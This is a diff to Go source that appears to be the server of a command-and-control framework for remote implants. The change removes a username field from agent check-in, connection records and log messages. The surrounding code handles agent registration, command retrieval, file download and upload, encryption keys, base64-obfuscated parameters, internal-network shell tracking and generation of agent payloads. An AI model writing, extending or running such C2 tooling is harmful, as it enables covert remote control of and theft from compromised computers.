@@ -124,7 +124,7 @@ type MainHandler struct{}
 
 // 无权限交互
 func (m *MainHandler) Index(conn, Get_Msg, switch_key, encry_key, download, result, net, info, upload, list,
-	option, uid_, username_, hostname, keyPart, filekey, windows_pro, port string) http.HandlerFunc {
+	option, uid_, hostname, keyPart, filekey, windows_pro, port string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		baseMutex.RLock()
 		base_rounds, exist_base := base_map[port]
@@ -158,11 +158,7 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, encry_key, download, resu
 				shellname_c, _ := customBase64Decode(shellname_get, code_rounds)
 				shellname := string(shellname_c)
 
-				username_get := r.URL.Query().Get(username_)
-				username_c, _ := customBase64Decode(username_get, code_rounds)
-				username := string(username_c)
-
-				key_base := Get_conn(uid, username, shellname, clientIP, base_rounds)
+				key_base := Get_conn(uid, shellname, clientIP, base_rounds)
 				fmt.Fprint(w, key_base)
 			case Get_Msg: //获取指令
 				data := GetMsg(uid, base_rounds, uidBytes)
@@ -1022,7 +1018,6 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 				case "agentcode":
 					uid, _ := body["uid"].(string)
 					username, _ := body["username"].(string)
-					user, _ := body["user"].(string)
 					hostname, _ := body["hostname"].(string)
 					keyPart, _ := body["keyPart"].(string)
 					filekey, _ := body["filekey"].(string)
@@ -1069,7 +1064,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						return
 					}
 					code := client_.Generate_agent(ptc, _os, server, Path, ConnPath, MsgPath, switch_key,
-						encry_key, download, result, _net, info, upload, list, option, username, user, uid,
+						encry_key, download, result, _net, info, upload, list, option, username, uid,
 						hostname, keyPart, filekey, code_, base_rounds, windows_pro)
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
@@ -1958,7 +1953,6 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						KeyPart      string `json:"keyPart"`
 						Filekey      string `json:"filekey"`
 						Protocol     string `json:"protocol"`
-						User         string `json:"user"`
 						Username     string `json:"username"`
 						Remark       string `json:"remark"`
 						CertContent  string `json:"cert"`
@@ -2024,7 +2018,6 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						requestData.Hostname,
 						requestData.KeyPart,
 						requestData.Filekey,
-						requestData.User,
 					}
 					pathSet := make(map[string]bool)
 					// 检查路径是否重复且不为空
@@ -2117,7 +2110,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						go protocol.Http_server(handler, serverManager, logger, requestData.Port, requestData.Path,
 							requestData.ConnPath, requestData.MsgPath, requestData.SwitchKey, requestData.EncryKey,
 							requestData.Download, requestData.Result, requestData.Net, requestData.Info, requestData.Upload,
-							requestData.List, requestData.Option, requestData.Protocol, requestData.Uid, requestData.User,
+							requestData.List, requestData.Option, requestData.Protocol, requestData.Uid,
 							requestData.Hostname, requestData.KeyPart, requestData.Filekey, requestData.Remark,
 							requestData.CertContent, requestData.KeyContent, requestData.WindowsPro, requestData.BaseRounds, requestData.ResponseHead, requestData.Username, log_word)
 					}
@@ -2589,10 +2582,10 @@ func Listen() string {
 	return string(b)
 }
 
-func Get_conn(uid, username, hostname, clientIP, base_rounds string) string {
+func Get_conn(uid, hostname, clientIP, base_rounds string) string {
 	current := time.Now()
 	formattedTime := current.Format("2006.01.02 15:04")
-	put_conn(username, hostname, formattedTime, uid, clientIP, "null")
+	put_conn(hostname, formattedTime, uid, clientIP, "null")
 
 	key1Mu.Lock()
 	key1_map[uid] = nil
@@ -4596,7 +4589,6 @@ type Server struct {
 	CertPath     string `json:"certPath"`
 	KeyPath      string `json:"keyPath"`
 	// Clients    int    `json:"clients"`
-	User         string `json:"user"`
 	Username     string `json:"username"`
 	Remark       string `json:"remark"`
 	Uid          string `json:"uid"`
@@ -4690,7 +4682,6 @@ var windows_clientMu sync.RWMutex
 
 // get_conn结构体
 type getConn struct {
-	Username   string `json:"username"`
 	Host       string `json:"host"`
 	OnlineTime string `json:"online_time"`
 	HostKey    string `json:"host_key"`
@@ -4779,10 +4770,9 @@ func put_innet(uid, target string, shell_innet []string) {
 }
 
 // 写入链接结构体
-func put_conn(username, host, online_time, uid, shell_ip, host_key string) {
+func put_conn(host, online_time, uid, shell_ip, host_key string) {
 	dataConnMu.Lock()
 	newConn := getConn{
-		Username:   username,
 		Host:       host,
 		OnlineTime: online_time,
 		HostKey:    host_key,
@@ -4791,7 +4781,7 @@ func put_conn(username, host, online_time, uid, shell_ip, host_key string) {
 	}
 	for i := range data_conn.Conns {
 		conn := &data_conn.Conns[i]
-		if username == conn.Username && uid == conn.Uid {
+		if uid == conn.Uid {
 			dataConnMu.Unlock()
 			return
 		}
@@ -4801,7 +4791,7 @@ func put_conn(username, host, online_time, uid, shell_ip, host_key string) {
 	
 	go PushData("", "listen")
 
-	log_str := fmt.Sprintf(log_word["request_host"], username, shell_ip, host, uid)
+	log_str := fmt.Sprintf(log_word["request_host"], shell_ip, host, uid)
 	logger.WriteLog(log_str)
 }
 
@@ -4809,7 +4799,7 @@ type MyServer struct{}
 
 func (s *MyServer) PutServer(
 	port, path, connPath, msgPath, switch_key, encry_key, download, result, net, info,
-	upload, list, option, protocol, user, remark string,
+	upload, list, option, protocol, remark string,
 	certPEM, keyPEM, uid, hostname, keyPart, filekey, windows_pro, base_rounds, resphead, username string,
 ) bool {
 	serverDataMu.Lock()
@@ -4842,7 +4832,6 @@ func (s *MyServer) PutServer(
 		CertPath:     certPEM,
 		KeyPath:      keyPEM,
 		// Clients:  clients,
-		User:         user,
 		Username:     username,
 		Remark:       remark,
 		Uid:          uid,
@@ -5212,7 +5201,7 @@ func Read_log_word() {
         "encry_tmp_fail": "%v file encryption failed: %v",
         "encry_tmp": "%v file encrypted successfully (%d bytes): %v",
         "Memory_clean": "Memory cleaned successfully!",
-        "request_host": "User request: Username: %v, IP: %v, Host: %v, UID: %v",
+        "request_host": "agent request: IP: %v, Host: %v, UID: %v",
         "login_success": "User login successful, from %v, user: %v",
         "login_fail": "User login failed, from %v, wrong username or password, user: %v, password: %v",
         "http_server":"[*] Start HTTP server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
